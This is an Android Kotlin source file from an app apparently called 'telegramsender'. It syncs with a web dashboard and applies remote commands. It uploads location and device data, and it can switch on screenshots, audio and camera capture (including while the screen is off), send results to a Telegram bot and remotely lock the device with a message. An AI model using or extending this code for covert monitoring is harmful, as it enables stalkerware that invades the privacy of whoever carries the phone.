package com.example.telegramsender.utils

import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.os.BatteryManager
import android.os.Build
import android.util.Log
import com.example.telegramsender.LockActivity
import com.example.telegramsender.MonitorService
import com.example.telegramsender.data.DevicePreferences
import com.example.telegramsender.network.ApiClient
import com.example.telegramsender.worker.SyncScheduler

object SyncHelper {
    private const val TAG = "SyncHelper"

    /**
     * Executes a full synchronization cycle between the Android app and the Web Dashboard.
     * Can be invoked by SyncWorker, MonitorService periodic loop, or manual user button click.
     */
    suspend fun performSync(context: Context): ApiClient.SyncResult {
        val jwt = DevicePreferences.getDeviceJwt(context)
        if (jwt.isNullOrEmpty()) {
            val err = "Device not registered or paired with dashboard."
            DevicePreferences.setLastSyncStatus(context, "NOT_REGISTERED")
            DevicePreferences.setLastSyncError(context, err)
            return ApiClient.SyncResult(success = false, errorMessage = err)
        }

        DevicePreferences.setLastSyncStatus(context, "SYNCING")

        try {
            // 1. Battery Information
            val batteryStatus: Intent? = IntentFilter(Intent.ACTION_BATTERY_CHANGED).let { filter ->
                context.registerReceiver(null, filter)
            }
            val level: Int = batteryStatus?.getIntExtra(BatteryManager.EXTRA_LEVEL, -1) ?: -1
            val scale: Int = batteryStatus?.getIntExtra(BatteryManager.EXTRA_SCALE, -1) ?: -1
            val batteryPct = if (level >= 0 && scale > 0) (level * 100 / scale) else 100
            val status: Int = batteryStatus?.getIntExtra(BatteryManager.EXTRA_STATUS, -1) ?: -1
            val isCharging = status == BatteryManager.BATTERY_STATUS_CHARGING || status == BatteryManager.BATTERY_STATUS_FULL

            // 2. High-Accuracy Location (Evaluated against Adaptive Schedule)
            val tgPref = context.getSharedPreferences("tg_pref", Context.MODE_PRIVATE)
            val isLocationEnabled = tgPref.getBoolean("sendLocation", true)
            val isDue = LocationScheduleHelper.isLocationDue(context)

            var lat: Double? = null
            var lon: Double? = null
            var accuracy: Float? = null

            if (isLocationEnabled && isDue) {
                val loc = LocationHelper.getBestLocation(context)
                lat = loc?.latitude
                lon = loc?.longitude
                accuracy = loc?.accuracy
                if (lat != null && lon != null) {
                    LocationScheduleHelper.recordLocationSent(context, System.currentTimeMillis())
                    Log.d(TAG, "Location recorded per schedule: $lat, $lon (accuracy: ${accuracy}m)")
                }
            } else {
                Log.d(TAG, "Location recording skipped (due=${isDue}, interval=${LocationScheduleHelper.getActiveIntervalSeconds(context)}s)")
            }

            // 3. Health & Diagnostic status
            val healthJson = DeviceHealthHelper.getDeviceHealth(context).toJsonObject()

            // 4. Pop executed command IDs for server acknowledgment
            val executedIds = DevicePreferences.getAndClearExecutedCommands(context)

            val wasLocked = DevicePreferences.isLocked(context)

            // 5. Contact Dashboard REST API
            val result = ApiClient.syncDevice(
                deviceJwt = jwt,
                batteryLevel = batteryPct,
                isCharging = isCharging,
                latitude = lat,
                longitude = lon,
                accuracy = accuracy,
                health = healthJson,
                executedCommandIds = executedIds,
                isLocked = wasLocked,
                appVersion = "1.1"
            )

            if (!result.success) {
                val errMsg = result.errorMessage ?: "Unknown sync error"
                Log.e(TAG, "Sync failed: $errMsg")
                DevicePreferences.setLastSyncStatus(context, "ERROR")
                DevicePreferences.setLastSyncError(context, errMsg)
                return result
            }

            // 6. Record Successful Sync
            val syncTimestamp = System.currentTimeMillis()
            DevicePreferences.setLastSyncTime(context, syncTimestamp)
            DevicePreferences.setLastSyncStatus(context, "SUCCESS")
            DevicePreferences.setLastSyncError(context, null)

            // Flush offline 20MB queue if items were buffered
            if (OfflineQueueManager.isNetworkAvailable(context) && OfflineQueueManager.getQueueItemCount(context) > 0) {
                try {
                    OfflineQueueManager.flushQueue(context)
                } catch (e: Exception) {
                    Log.w(TAG, "Offline queue flush error during sync", e)
                }
            }

            // 7. Apply Remote Configuration to App Preferences (tg_pref)
            val cfg = result.config
            val editor = tgPref.edit()

            if (cfg.telegramBotToken.isNotEmpty()) {
                editor.putString("token", cfg.telegramBotToken)
            }
            if (cfg.telegramChatId.isNotEmpty()) {
                editor.putString("chatId", cfg.telegramChatId)
            }
            editor.putBoolean("is_monitoring_active", cfg.isMonitoringActive)
            editor.putBoolean("sendScreenshot", cfg.sendScreenshot)
            editor.putLong("screenshotInterval", cfg.screenshotInterval)
            editor.putBoolean("sendLocation", cfg.sendLocation)
            editor.putLong("locationInterval", cfg.locationInterval)
            editor.putBoolean("sendAudio", cfg.sendAudio)
            editor.putLong("audioDuration", cfg.audioDuration)
            editor.putBoolean("audioScreenOff", cfg.audioScreenOff)
            editor.putBoolean("sendCamera", cfg.sendCamera)
            editor.putLong("cameraInterval", cfg.cameraInterval)
            editor.putBoolean("cameraScreenOff", cfg.cameraScreenOff)
            editor.putString("cameraFacing", cfg.cameraFacing)
            editor.apply()

            LocationScheduleHelper.saveConfig(
                context,
                cfg.locationSchedulesJson,
                cfg.locationDefaultIntervalSeconds
            )

            // Update Sync Interval in preferences & scheduler if changed
            val currentIntervalSec = DevicePreferences.getSyncIntervalSeconds(context)
            if (cfg.syncIntervalSeconds != currentIntervalSec && cfg.syncIntervalSeconds >= 5) {
                DevicePreferences.setSyncIntervalSeconds(context, cfg.syncIntervalSeconds)
                SyncScheduler.schedulePeriodicSync(context, Math.max(1L, cfg.syncIntervalSeconds / 60))
            }

            // 8. Execute Commands from Dashboard
            var shouldLock = result.isLocked
            var lockMsg = result.lockMessage
            var explicitLockCommand = false

            for (cmd in result.pendingCommands) {
                when (cmd.type) {
                    "LOCK_DEVICE" -> {
                        shouldLock = true
                        explicitLockCommand = true
                        val msg = cmd.params?.optString("message")
                        if (!msg.isNullOrEmpty()) lockMsg = msg
                    }
                    "UNLOCK_DEVICE" -> {
                        shouldLock = false
                    }
                    "UPDATE_CONFIG" -> {
                        val sec = cmd.params?.optLong("syncIntervalSeconds", 0L) ?: 0L
                        if (sec >= 5) {
                            DevicePreferences.setSyncIntervalSeconds(context, sec)
                            SyncScheduler.schedulePeriodicSync(context, Math.max(1L, sec / 60))
                        }
                        val facing = cmd.params?.optString("cameraFacing")
                        if (!facing.isNullOrEmpty()) {
                            tgPref.edit().putString("cameraFacing", facing).apply()
                        }
                        val schedulesArr = cmd.params?.optJSONArray("locationSchedules")
                        val defInterval = cmd.params?.optLong("locationDefaultIntervalSeconds", 60L) ?: 60L
                        if (schedulesArr != null) {
                            LocationScheduleHelper.saveConfig(context, schedulesArr.toString(), defInterval)
                        }
                    }
                    "PING_DEVICE", "SYNC_NOW" -> {
                        Log.d(TAG, "Device ping received and acknowledged: ${cmd.id}")
                    }
                    "PING_LOCATION" -> {
                        LocationScheduleHelper.forceNextLocation(context)
                        context.sendBroadcast(Intent("com.example.telegramsender.ACTION_FORCE_LOCATION"))
                    }
                    "CAPTURE_PHOTO" -> {
                        val facing = cmd.params?.optString("camera")
                        if (!facing.isNullOrEmpty()) {
                            tgPref.edit().putString("cameraFacing", facing).apply()
                        }
                        context.sendBroadcast(Intent("com.example.telegramsender.ACTION_SNAP_PHOTO"))
                    }
                }
                DevicePreferences.addExecutedCommand(context, cmd.id)
            }

            DevicePreferences.setLocked(context, shouldLock, lockMsg)

            // CRITICAL: Only start LockActivity if an explicit lock command arrived or transitioning to locked.
            // Never launch activity repeatedly in background periodic sync loops!
            if (shouldLock && (explicitLockCommand || !wasLocked)) {
                try {
                    val lockIntent = Intent(context, LockActivity::class.java).apply {
                        flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP
                        putExtra("LOCK_MESSAGE", lockMsg)
                    }
                    context.startActivity(lockIntent)
                } catch (e: Exception) {
                    Log.e(TAG, "Failed to launch LockActivity", e)
                }
            }

            // Build human-readable summary
            val summary = buildString {
                append("Synced: ")
                if (cfg.telegramBotToken.isNotEmpty()) append("Telegram Bot Configured, ")
                append("Master: ${if (cfg.isMonitoringActive) "ACTIVE" else "PAUSED"}, ")
                append("Screens (${cfg.screenshotInterval}s), ")
                append("GPS (${cfg.locationInterval}m), ")
                append("Cam (${if (cfg.sendCamera) cfg.cameraFacing else "OFF"}), ")
                append("Audio (${if (cfg.sendAudio) "${cfg.audioDuration}s" else "OFF"})")
                if (result.pendingCommands.isNotEmpty()) {
                    append(", ${result.pendingCommands.size} commands executed")
                }
            }
            DevicePreferences.setLastSyncSummary(context, summary)

            // Start MonitorService if monitoring was activated
            if (cfg.isMonitoringActive && (cfg.sendAudio || cfg.sendCamera || cfg.sendLocation)) {
                try {
                    val monitorIntent = Intent(context, MonitorService::class.java)
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                        context.startForegroundService(monitorIntent)
                    } else {
                        context.startService(monitorIntent)
                    }
                } catch (e: Exception) {
                    Log.w(TAG, "Could not start MonitorService", e)
                }
            }

            return result
        } catch (e: Exception) {
            val errorMsg = e.message ?: "Sync execution error"
            Log.e(TAG, "Sync exception", e)
            DevicePreferences.setLastSyncStatus(context, "ERROR")
            DevicePreferences.setLastSyncError(context, errorMsg)
            return ApiClient.SyncResult(success = false, errorMessage = errorMsg)
        }
    }
}
